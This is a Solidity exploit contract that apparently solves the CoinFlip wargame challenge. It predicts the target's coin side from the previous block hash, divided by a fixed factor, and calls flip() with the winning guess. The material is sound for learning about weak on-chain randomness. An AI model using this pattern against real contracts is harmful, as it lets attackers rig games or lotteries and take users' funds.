// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "interfaces/ICoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    ICoinFlip coinFlip;
    address public instanceAddress;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip _coinFlip) public {
        coinFlip = _coinFlip;
    }

    function flipToWin() public {
        bool winningSide = testFlip();
        coinFlip.flip(winningSide);
    }

    function testFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}
